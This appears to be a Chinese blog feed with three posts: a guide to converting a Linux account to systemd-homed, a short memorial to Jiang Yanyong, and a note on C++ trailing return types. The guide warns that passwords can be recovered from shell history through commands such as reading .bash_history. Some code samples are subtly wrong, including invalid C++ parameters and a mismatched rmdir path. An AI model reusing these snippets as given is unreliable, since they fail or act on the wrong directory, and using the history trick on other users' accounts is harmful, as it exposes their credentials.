<p>(不喜欢折腾的人不推荐这么干，原来的又不是不能用了</p>
<p>其实建议你直接去看<span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">官网的英文说明<i class="fa fa-external-link-alt"></i></span>，这个是给不想看官方文档的懒狗准备的（不会吧不会吧，不会真有这种懒狗吧）</p>
<p>切到root操作，先重命名你的用户目录，随便移到一个空间够的位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> /home/zhixi /home/zhixi.saved</span><br></pre></td></tr></table></figure>

<p>然后看一下你的用户设置（假设用户名是zhixi,GID&#x3D;1000），以及所在的用户组设置（1000改成你的GID）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getent passwd zhixi</span><br><span class="line">getent shadow zhixi</span><br><span class="line">getent group 1000</span><br></pre></td></tr></table></figure>

<p>（上面是官方文档的做法，也可以用<code>lslogin -u</code>查看）</p>
<p>把上面这些也备份一下。然后把<code>/etc/passwd</code>和<code>/etc/shadow</code>和<code>/etc/group</code>还有<code>/etc/gshadow</code>里面的zhixi用户相关的东西删了（基本上就只有一行）。</p>
<p>（官方文档说为了安全请使用<code>vipw</code>, <code>vipw -s</code>, <code>vigr</code> and <code>vigr -s</code>，这些是给配置文件加锁，防止多人同时更改出现问题，使用跟vim一样（找到那一行按dd然后ESC, :,wq回车就好了），如果你确定是自己一个人操作（也没有别人远程登陆或者其他程序正在修改），似乎用别的什么文本编辑器也没什么问题）</p>
<p>（其实，你可以直接用<code>userdel</code>删除）</p>
<p>然后剩下的操作跟第一节一样，用<code>homectl</code>新建一个就好了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">homectl create zhixi --uid=1000 --real-name=zjk</span><br></pre></td></tr></table></figure>

<p>(uid填你的uid，real-name后面填你的GECOS)</p>
<p>可能你还想改改磁盘加密方式什么的，想设置的都先设置好。</p>
<p>然后rsync把原来备份了的东西放回<code>/home/zhixi</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">homectl with zhixi -- rsync -aHAXv --remove-source-files /home/zhixi.saved/ . &amp;&amp;  <span class="built_in">rmdir</span> /home/foobar.saved</span><br></pre></td></tr></table></figure>

<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>systemd-homed是一个用户一个私有用户组。如果你一个用户组设置了多个用户的话，可能要调整一下。</p>
<h2 id="systemd-homed简介"><a href="#systemd-homed简介" class="headerlink" title="systemd-homed简介"></a>systemd-homed简介</h2><p><del>感觉这下子systemd接管的东西更多了</del></p>
<h3 id="以前的用户和用户组管理"><a href="#以前的用户和用户组管理" class="headerlink" title="以前的用户和用户组管理"></a>以前的用户和用户组管理</h3><p>好吧，以前要加引号，现在这个在大部分Linux都还没人用呢（甚至连一篇中文介绍都没有）。</p>
<p>通常使用<code>useradd</code>或<code>adduser</code>新建用户（不同发行版这两条命令有一点区别），比如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">useradd -U temp</span><br><span class="line">sudo useradd temp1 -m -G temp</span><br></pre></td></tr></table></figure>

<p>新建一个temp用户组并给temp用户组中新建一个叫temp1的用户（同时在<code>/home</code>下新建一个<code>temp1</code>目录作为用户目录）。</p>
<p>然后使用<code>passwd temp1</code>为用户temp1指定密码</p>
<p>（虽然useradd有<code>-p</code>选项可以直接指定密码，通常不建议这样做，因为这样子恁的密码会明文留在历史命令里，如果有人不怀好意的执行一下<code>history</code>或者<code>more /home/$USER/.bash_history</code>或者<code>ctrl+r</code>搜索useradd，他将轻易获取你的密码），你用了sudo也可能会被找到，比如<span class="exturl" data-url="aHR0cHM6Ly9zdXBlcnVzZXIuY29tL3F1ZXN0aW9ucy8zMDk0MzQvaG93LXRvLXZpZXctY29tbWFuZC1oaXN0b3J5LW9mLWFub3RoZXItdXNlci1pbi1saW51eA==">这个<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vbmV3cy8xMzU4NDUuaHRtbA==">https://www.freebuf.com/news/135845.html<i class="fa fa-external-link-alt"></i></span> history -c 也不太保险</p>
<p>你的用户名、密码、用户组、权限配置基本都放在<code>/etc</code>目录下面，比如<code>/etc/passwd</code>里面存你的密码，<code>etc/group</code>里面放用户组的设置。<code>/etc/sudoers</code>是超级用户的设置。每个用户的配置散落在各个地方，一些个人设置还被放在了<code>/home/user</code>底下。</p>
<p>这个样子你需要<code>/etc</code>的写权限，一个用户不同系统迁移的时候需要同时迁移其他的目录（而且UID还得一样），想对<code>/home</code>单独加密也不太方便。</p>
<h3 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h3><p>主要的变化就是你的个人用户都扔到<code>/home/yourusername</code>下面了。（据说）这样更方便加密和迁移。默认采用LUKS，在用户登陆的时候解密并挂载<code>/home/user</code>，在用户退出登陆的时候加密并取消挂载。休眠挂起（Suspend）的时候也会加密锁住。</p>
<p>比如你有一个u盘，里面装了你的用户目录，到别的电脑上插上去就能用了，不需要那边给你新建一个用户（现在基本不太行，对面电脑起码得也是systemd 245 版本以上还得启用<code>systemd-homed</code>，我乐观估计等这玩意普及至少得两年吧，那些用老CentOS的万年钉子户更别想了）</p>
<p>这样也方便全盘加密（我不是那种对物理安全都看的很在乎的申必人士，据说全盘加密会有点性能问题，而且休眠睡眠也比较容易起不来，所以我没试过）（不过恁不用这个systemd-homed其实也能全盘加密）</p>
<p>现在使用<code>systemd-homed.service</code>和<code>systemd-userdbd.service</code>两个daemon管理用户，登陆的时候是<code>systemd-logind</code> 在管。大概是这么个流程：</p>
<p><img src="/systemd-homed/image-20201108172857040.png"></p>
<p><img src="/systemd-homed/image-20201108172321494.png"></p>
<p>另外，Yubikeys现在是一等公民（说的好像这小玩意这么贵我买得起一样）<br>Yubikeys或者别的加密设备我手头没有，而且LUKS加密home目录之类的我也没有那么高的安全需求，哪位好心人要是愿意送&#x2F;借我一个玩玩，我把这部分内容补上</p>
<h3 id="现在的样子"><a href="#现在的样子" class="headerlink" title="现在的样子"></a>现在的样子</h3><p>使用<code>homectl activate</code>激活用户目录后你会看到在<code>/home</code>目录下多了一个用户目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ homectl activate zhixi</span><br><span class="line">🔐 Please enter password <span class="keyword">for</span> user zhixi: ****** </span><br></pre></td></tr></table></figure>

<p>原来<code>/home</code>下只有一个zhixi.home，activate之后多了一个zhixi目录</p>
<p>我们看一下这个目录下面有什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/zhixi &amp;&amp; <span class="built_in">ls</span> -a</span><br><span class="line">.  ..  .bash_logout  .bash_profile  .bashrc  .identity</span><br></pre></td></tr></table></figure>

<p>其中的<code>.identity</code>存放你的密码等登陆认证信息（以json存储用户记录（JSON User Recoed））,大概长这样</p>
<p><img src="/systemd-homed/image-20201108170804174.png" alt="image-20201108170804174"></p>
<p><code>homectl inspect username</code>可以查看用户信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ homectl inspect zhixi</span><br><span class="line">   User name: zhixi</span><br><span class="line">       State: active</span><br><span class="line"> Disposition: regular</span><br><span class="line"> Last Change: Sat 2020-10-31 17:05:25 CST</span><br><span class="line">    Login OK: <span class="built_in">yes</span></span><br><span class="line"> Password OK: <span class="built_in">yes</span></span><br><span class="line">         UID: 60353</span><br><span class="line">         GID: 60353 (zhixi)</span><br><span class="line">   Directory: /home/zhixi</span><br><span class="line">     Storage: luks (strong encryption)</span><br><span class="line">  Image Path: /home/zhixi.home</span><br><span class="line">   Removable: no</span><br><span class="line">       Shell: /bin/bash</span><br><span class="line">LUKS Discard: online=no offline=<span class="built_in">yes</span></span><br><span class="line">   LUKS UUID: 107ff22e399d417d92f398c91275de3b</span><br><span class="line">   Part UUID: 645499ec3e554eaca0f09a9b172d89b3</span><br><span class="line">     FS UUID: a6b5969ecfee4ae49f0cad9931f31589</span><br><span class="line"> File System: ext4</span><br><span class="line"> LUKS Cipher: aes</span><br><span class="line"> Cipher Mode: xts-plain64</span><br><span class="line">  Volume Key: 256bit</span><br><span class="line"> Mount Flags: nosuid nodev <span class="built_in">exec</span></span><br><span class="line">   Disk Size: 654.0G</span><br><span class="line">  Disk Usage: 11.3G (= 1.8%)</span><br><span class="line">   Disk Free: 642.7G (= 98.2%)</span><br><span class="line">  Disk Floor: 11.3G</span><br><span class="line">Disk Ceiling: 769.5G</span><br><span class="line">  Good Auth.: 1</span><br><span class="line">   Last Good: Sat 2020-10-31 19:23:25 CST</span><br><span class="line">   Bad Auth.: 1</span><br><span class="line">    Last Bad: Sat 2020-10-31 19:23:17 CST</span><br><span class="line">    Next Try: anytime</span><br><span class="line"> Auth. Limit: 30 attempts per 1min</span><br><span class="line">   Passwords: 1</span><br><span class="line">  Local Sig.: <span class="built_in">yes</span></span><br><span class="line">     Service: io.systemd.Home</span><br><span class="line">lines 2-36/36 (END)</span><br></pre></td></tr></table></figure>

<h3 id="存在的一些问题"><a href="#存在的一些问题" class="headerlink" title="存在的一些问题"></a>存在的一些问题</h3><p>这个东西主要是focus on <code> particularly Laptop users</code>，目前可能多多少少有点小问题。企业用途和运维貌似也不怎么需要这个。</p>
<h4 id="SSH的问题"><a href="#SSH的问题" class="headerlink" title="SSH的问题"></a>SSH的问题</h4><p>这个东西直接把&#x2F;home全都加密了，当然也包括<code>.ssh</code>目录下面的东西。</p>
<p>目前看来没有什么很完美的办法，有人是这样干的：先整一个其他的空用户在他的&#x2F;home&#x2F;user下面存公钥，用密码登陆，然后su切过去。(反正看起来挺扭曲的)</p>
<p>不过对于笔记本个人用户来说SSH到自己的加密盘貌似不是什么刚需，还是等完善了随身带着硬盘走比较好。</p>
<h4 id="休眠"><a href="#休眠" class="headerlink" title="休眠"></a>休眠</h4><p>貌似不少人会碰到奇奇怪怪的休眠问题，很在意休眠的笔记本用户请谨慎上车。</p>
<h4 id="删除用户后SDDM仍有残留"><a href="#删除用户后SDDM仍有残留" class="headerlink" title="删除用户后SDDM仍有残留"></a>删除用户后SDDM仍有残留</h4><p>用<code>homectl activate</code>激活了一个用户temp1，然后用<code>homectl remove</code>删除了这个用户temp1，结果发现我的SDDM在登陆页面仍然有原来的temp1。检查<code>/home</code>发现这下面已经没有temp1.home文件了，但是还有temp1这个文件夹（受保护）。</p>
<p>我又用刚才新建的用户zhixi试了一下，在inactive情况下会比较干净的remove。</p>
<h2 id="可能的报错"><a href="#可能的报错" class="headerlink" title="可能的报错"></a>可能的报错</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">homectl su: Authentication service cannot retrieve authentication info</span><br></pre></td></tr></table></figure>

<p>可能是你的daemon没启动，试试启动daemon并重启一下试试。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Operation on home me failed: Specified user name me conflicts with an NSS group by the same name, refusing.</span><br></pre></td></tr></table></figure>

<p>用户组冲突了，看看你之前是不是用useradd之类的操作新建过同名用户组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su: Authentication service cannot retrieve authentication info</span><br></pre></td></tr></table></figure>

<p>这个报错出现在我换到systemd-homed后试图用su切换用户。一开始我用 su 在桌面环境下切用户就没成功过，退出登陆后跑到SDDM里是可以的，本来以为这是个feature。后来觉得不应该啊，一查果然，要手动改PAM设置，在<code>/etc/pam.d</code>里面改一下su的配置就好了。配置照着模板改就好了，<code>man pam_systemd_home</code>，详情参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWRlc2t0b3Aub3JnL3NvZnR3YXJlL3N5c3RlbWQvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuaHRtbA==">pam_systemd_home<i class="fa fa-external-link-alt"></i></span>，arch用户看<span class="exturl" data-url="aHR0cHM6Ly9qbGsuZmpmaS5jdnV0LmN6L2FyY2gvbWFucGFnZXMvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuOA==">这里<i class="fa fa-external-link-alt"></i></span></p>
<p><img src="/systemd-homed/image-20201108142022596.png" alt="PAM模板例子"></p>
<p>而且看起来很多时候有root权限它还是会让你输入当前用户的密码，比如<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5c3RlbWQvc3lzdGVtZC9pc3N1ZXMvMTYxNjY=">这个issue<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Operation on home username failed: Access denied</span><br></pre></td></tr></table></figure>

<p>权限不够，你至少需要root权限或者要切换到的那个用户的密码才能操作对应目录或者修改配置。（貌似homectl的很多操作需要输入）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Operation on home username failed: Failed to execute operation: File exists</span><br></pre></td></tr></table></figure>

<p>这个错误的原因可能有很多，或许可以试试<code>systemctl restart systemd-homed</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Unknown (FileSystemError): Error: ENOSPC: no space left on device, write)</span><br></pre></td></tr></table></figure>

<p>我新建第二个的时候没有指定存储空间，直接塞满了。用<code>homectl resize user 10G</code>调整了磁盘分配后解决。</p>
<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>给不愿意<code>--help</code>看英文说明的懒狗翻译一下命令选项</p>
<h3 id="homectl命令选项"><a href="#homectl命令选项" class="headerlink" title="homectl命令选项"></a>homectl命令选项</h3><table>
<thead>
<tr>
<th>homectl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>list</td>
<td>List home areas</td>
<td>列出用户信息（包括NAME  UID  GID  STATE   REALNAME HOME     SHELL）</td>
<td>homectl    list</td>
<td></td>
</tr>
<tr>
<td>activate USER…</td>
<td>Activate a home area</td>
<td>激活用户（执行后<code>/home</code>下面会多出一个和用户同名的目录）</td>
<td>homectl activate zhixi</td>
<td></td>
</tr>
<tr>
<td>deactivate USER…</td>
<td>Deactivate a home area</td>
<td>取消激活</td>
<td>homectl deactivate zhixi</td>
<td></td>
</tr>
<tr>
<td>inspect USER…</td>
<td>Inspect a home area</td>
<td>查看用户信息，跟userdbctl user… 的输出差不多</td>
<td>homectl inspect zhixi</td>
<td></td>
</tr>
<tr>
<td>authenticate USER…</td>
<td>Authenticate a home area</td>
<td>验证用户</td>
<td>homectl authenticate zhixi</td>
<td></td>
</tr>
<tr>
<td>create USER</td>
<td>Create a home area</td>
<td>新建用户</td>
<td>homectl create zhixi</td>
<td></td>
</tr>
<tr>
<td>remove USER…</td>
<td>Remove a home area</td>
<td>移除用户</td>
<td>homectl remove zhixi</td>
<td></td>
</tr>
<tr>
<td>update USER</td>
<td>Update a home area</td>
<td>更改用户设置和状态</td>
<td>homectl update me –locked&#x3D;false</td>
<td></td>
</tr>
<tr>
<td>passwd USER</td>
<td>Change password of a home area</td>
<td>改密码</td>
<td>homectl passwd zhixi</td>
<td></td>
</tr>
<tr>
<td>with USER [COMMAND…]</td>
<td>Run shell or command with access to a home area</td>
<td>用到&#x2F;在某个用户目录下执行命令（需要root或该用户密码）</td>
<td>homectl with zhixi – mkdir test1</td>
<td></td>
</tr>
<tr>
<td>resize USER SIZE</td>
<td>Resize a home area</td>
<td>调整用户的存储空间</td>
<td>homectl resize zhixi 30G</td>
<td></td>
</tr>
<tr>
<td>lock USER…</td>
<td>Temporarily lock an active home area</td>
<td>锁定用户</td>
<td>homectl lock zhixi</td>
<td></td>
</tr>
<tr>
<td>unlock USER</td>
<td>Unlock a temporarily locked home area</td>
<td>解锁用户</td>
<td>homectl unlock zhixi</td>
<td></td>
</tr>
</tbody></table>
<h3 id="userdbctl命令选项"><a href="#userdbctl命令选项" class="headerlink" title="userdbctl命令选项"></a>userdbctl命令选项</h3><table>
<thead>
<tr>
<th>userdbctl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
</tr>
</thead>
<tbody><tr>
<td>user [USER…]</td>
<td>Inspect user</td>
<td>查看用户信息</td>
<td>userdbctl user zhixi</td>
</tr>
<tr>
<td>group [GROUP…]</td>
<td>Inspect group</td>
<td>查看用户组信息</td>
<td>userdbctl group zhixi</td>
</tr>
<tr>
<td>users-in-group [GROUP…]</td>
<td>Show users that are members of specified group(s)</td>
<td>查看组中用户</td>
<td>userdbctl users-in-group zhixi</td>
</tr>
<tr>
<td>groups-of-user [USER…]</td>
<td>Show groups the specified user(s) is a member of</td>
<td>查看用户所在的组</td>
<td>userdbctl groups-of-user zhixi</td>
</tr>
</tbody></table>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0hPTUVfRElSRUNUT1JZLw==">https://systemd.io/HOME_DIRECTORY/<i class="fa fa-external-link-alt"></i></span> 官方文档</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubWFuNy5vcmcvbGludXgvbWFuLXBhZ2VzL21hbjEvaG9tZWN0bC4xLmh0bWw=">https://www.man7.org/linux/man-pages/man1/homectl.1.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWRlc2t0b3Aub3JnL3NvZnR3YXJlL3N5c3RlbWQvbWFuL2hvbWVjdGwuaHRtbA==">https://www.freedesktop.org/software/systemd/man/homectl.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzgxNDA2OC8=">systemd 245 released<i class="fa fa-external-link-alt"></i></span> systemd第245次更新详情</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1N5c3RlbWQtaG9tZWQ=">https://wiki.archlinux.org/index.php/Systemd-homed<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1VzZXJzX2FuZF9ncm91cHNfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">https://wiki.archlinux.org/index.php/Users_and_groups_(简体中文)<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">https://systemd.io/CONVERTING_TO_HOMED/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy9mZ2M5MWIvd2l0aF9zeXN0ZW1kXzI0NV9sYW5kaW5nX2luX3JlcG9zX3N5c3RlbWRob21lZF9pcy8=">https://www.reddit.com/r/archlinux/comments/fgc91b/with_systemd_245_landing_in_repos_systemdhomed_is/<i class="fa fa-external-link-alt"></i></span> 在Arch上使用的reddit讨论，archwiki的页面也是这个帖子的楼主写的</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpYS5jY2MuZGUvdi9BU0cyMDE5LTE2NC1yZWludmVudGluZy1ob21lLWRpcmVjdG9yaWVz">https://media.ccc.de/v/ASG2019-164-reinventing-home-directories<i class="fa fa-external-link-alt"></i></span> 一个传教视频</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jZnAuYWxsLXN5c3RlbXMtZ28uaW8vbWVkaWEvaG9tZWQtYXNnMjAxOS5wZGY=">https://cfp.all-systems-go.io/media/homed-asg2019.pdf<i class="fa fa-external-link-alt"></i></span> 一个传教PPT</p>
<p>其他的一些简介</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eHJldmlld3Mub3JnL1N5c3RlbWQtSG9tZWRfSXNfTWVyZ2VkX0FuZF9JdF9XaWxsX0Z1bmRhbWVudGFsbHlfQ2hhbmdlX0xpbnV4X0hvbWVfRGlyZWN0b3JpZXM=">https://linuxreviews.org/Systemd-Homed_Is_Merged_And_It_Will_Fundamentally_Change_Linux_Home_Directories<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjaHJlcHVibGljLmNvbS9hcnRpY2xlL2xpbnV4LWhvbWUtZGlyZWN0b3J5LW1hbmFnZW1lbnQtaXMtYWJvdXQtdG8tdW5kZXJnby1tYWpvci1jaGFuZ2Uv">https://www.techrepublic.com/article/linux-home-directory-management-is-about-to-undergo-major-change/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>homectl</tag>
        <tag>systemd-homed</tag>
      </tags>
  </entry>
  <entry>
    <title>纪念蒋彦永先生</title>
    <url>/SARS-cov-2/</url>
    <content><![CDATA[<p>So this is how liberty die, with thunderous applause</p>
<span id="more"></span>

<p>想来我也算半个医学逃兵，颇有些惭愧（元旦那会听某个学医的群友在小群里说武汉不太平，然而我怂，即没敢跟周围任何熟人说也没敢发到国内群里，完美逃过了央视训诫…….</p>
<blockquote>
<p>黑格尔在某个地方说过，一切伟大的世界历史事变和人物，可以说都出现两次。他忘记补充一点：第一次是作为悲剧出现，第二次是作为笑剧出现。<br>—-鹿克斯《路易·波拿巴的雾月十八》</p>
</blockquote>
<p>没多少人提起，蒋先生的往事。<br>据说蒋先生现在身体也不太好，唉。</p>
<p><img src="/SARS-cov-2/%E8%92%8B%E5%BD%A6%E6%B0%B8.webp" alt="蒋彦永先生"></p>
<p>“我之所以能直面现实，是因为我相信我们的国家。因为国家如果能从我提供的这些情况吸取一定的教训，因此建立好公共防疫制度，从SARS的挑战与困境中站起来，获得全世界人民的信任。”</p>
<p>这次怕是让老爷子心寒了</p>
<blockquote>
<p>因笑王谢诸人，登高怀远，也学英雄涕</p>
</blockquote>
<p>2023年更：</p>
<p>蒋彦永先生在2023年3月12日去世了，距03年非典也过去20了，陈年旧事少有人愿意提起。在知乎直接搜索名字都查无此人的情况下，很少有人还能想起蒋彦永，我也是过了几个月后想起蒋先生搜了一下才听闻蒋先生已经去世了。然后去找了一下才发现当时微信纪念蒋彦永先生的文章也早就被一个一个删除了，落了片白茫茫大地真干净。</p>
<p>3年过去了，闹剧也在去年的年底悄然落幕了，春暖花开，仿佛疫情没有来过。作为他们口中的躺匪，我和共存派也在网上也吵了很久，眼看着随着一轮轮封城封小区封校，共存派的声音一天天大了起来，清零派的声音一天天小了起来，直到去年冬天的临界点。</p>
<p>三年前作为全网夸赞的河南，堵路封村，拉开了防疫的</p>
<p>君以此始，必以此终。</p>
<p>不知道蒋先生看到疫情这三年作何感想。三年防疫以这种方式结束，仿佛什么都没有发生过，一切都戛然而止。蒋先生一生坎坷，临终看到防疫结束，或许也能九泉之下安息了吧。</p>
<p><img src="/SARS-cov-2/1696341380.png"></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>SARS</tag>
      </tags>
  </entry>
  <entry>
    <title>C++返回值类型后置</title>
    <url>/type-anastrophe/</url>
    <content><![CDATA[<p>不喜欢倒装吗你们</p>
<span id="more"></span>

<p>类型后置的语言一般长这样，比如go，函数的返回值类型是放在后面的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mul</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a * b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rust也是：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">mul</span>(a: <span class="type">i32</span>, b: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    a * b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>甚至py也可以指定函数返回值类型。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a: <span class="built_in">int</span>, b: <span class="built_in">int</span> </span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> a*b</span><br></pre></td></tr></table></figure>

<p>但是大家熟悉的c，函数是这样，返回值类型在最前面。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mul</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反而是c语言的类型前置才像个异类。当初从c入坑go的时候，总感觉后置比较别扭，后来发现是我被c毒害的太深了：<span class="exturl" data-url="aHR0cHM6Ly9nby5kZXYvYmxvZy9kZWNsYXJhdGlvbi1zeW50YXg=">Go’s declaration syntax<i class="fa fa-external-link-alt"></i></span>  </p>
<p>这是c，返回值类型前置</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> (*(*fp)(<span class="type">int</span> (*)(<span class="type">int</span>, <span class="type">int</span>), <span class="type">int</span>))(<span class="type">int</span>, <span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>这是go，返回值类型甩在后面</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">f <span class="title function_">func</span><span class="params">(func(<span class="type">int</span>,<span class="type">int</span>) <span class="type">int</span>, <span class="type">int</span>)</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span> <span class="type">int</span></span><br></pre></td></tr></table></figure>

<p>写一个闭包看起来也很自然：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sum := <span class="function"><span class="keyword">func</span><span class="params">(a, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123; <span class="keyword">return</span> a+b &#125; (<span class="number">3</span>, <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>写多了go可能会感觉到，go里面很少出现c语言一样一大坨*号和括号挤在一起，区分不出来这到底是个啥。函数返回值后置就比较舒服，一般写函数的时候都是返回值在后面的，lambda表达式也是。</p>
<p>$$<br>f(x, y) &#x3D; x \times y<br>$$</p>
<p>对于空的返回值，扔在后面直接不写看起来也更加自然。一个void总是怪怪的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">echo</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="built_in">println</span>(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>网上有相当多的文章教大家怎么识别c语言的复杂的类型定义。什么函数指着呐，什么指针函数呐。甚至有一些网站，比如<span class="exturl" data-url="aHR0cHM6Ly9jZGVsLm9yZy8=">cdel<i class="fa fa-external-link-alt"></i></span>专门给你拆解这是个啥。别的语言为啥就没有呢？</p>
<p>后来接触了好多返回值后置的语言，我才意识到：看不c语言这一大坨东西，不是我的问题，是c的问题。。。你看下面这一串是个啥，你不说这是c我都要幻视了以为是lisp呢。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 括号乱起来了</span></span><br><span class="line"><span class="type">int</span> (*(*foo)())()</span><br><span class="line"><span class="comment">// 下面这个更有内味</span></span><br><span class="line">(*(<span class="type">void</span>(*)())<span class="number">0</span>)();</span><br></pre></td></tr></table></figure>

<p>c++11也有类型后置的写法，前面使用auto占位。比较符合我先写输入再写输出的喜欢，现在rust和go写多了经常c++一起手就在先思考一下函数返回值类型那里愣住了五秒。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">mul</span><span class="params">(<span class="type">int</span> a, b)</span> -&gt; <span class="type">int</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配合decltype可以实现类型推导。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt;</span></span><br><span class="line"><span class="function"><span class="title">decltype</span><span class="params">((*(T1 *) <span class="number">0</span>) + (*(T2 *) <span class="number">0</span>))</span> <span class="title">mul</span><span class="params">(T1 a, T2 b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以用auto占位写成后置</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T1, <span class="keyword">typename</span> T2&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">mul</span><span class="params">(T1 a, T2 b)</span> -&gt; <span class="title">decltype</span><span class="params">(a * b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> v = <span class="built_in">mul</span>(<span class="number">1.0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">auto</span> u = <span class="built_in">mul</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


